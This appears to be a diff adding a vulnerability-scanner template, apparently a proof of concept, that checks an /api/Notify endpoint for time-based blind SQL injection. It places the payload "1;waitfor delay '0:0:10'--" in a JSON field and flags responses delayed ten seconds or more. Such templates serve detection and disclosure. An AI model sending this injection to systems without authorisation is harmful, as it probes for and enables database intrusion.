@@ -1,0 +1,46 @@
+id: time-based-blind-sqli-delay-10s
+
+info:
+  name: Time-Based Blind SQLi (10s delay)
+  author: your-name
+  severity: high
+  description: |
+    This template checks for time-based blind SQL injection using a 10-second delay via the `techid` parameter.
+  tags: sqli,blind,time-based
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/Notify"
+
+    headers:
+      Accept-Encoding: gzip, deflate, br
+      Accept: "*/*"
+      Accept-Language: en-US;q=0.9,en;q=0.8
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
+      Cache-Control: max-age=0
+      Content-Type: application/json
+
+    body: |
+      {
+        "sessionid": "SESSION_ID_VALUE",
+        "tracking0": "ticket12345",
+        "techid": "1;waitfor delay '0:0:10'--",
+        "pickuptime": "2025-03-03T10:00:00",
+        "lastactiontime": "2025-03-03T11:30:00",
+        "chatlog": "Sprocket Security PoC test"
+      }
+
+    timeout: 15
+
+    extractors:
+      - type: dsl
+        name: duration
+        internal: true
+        dsl:
+          - duration
+
+    matchers:
+      - type: dsl
+        dsl:
+          - duration >= 10
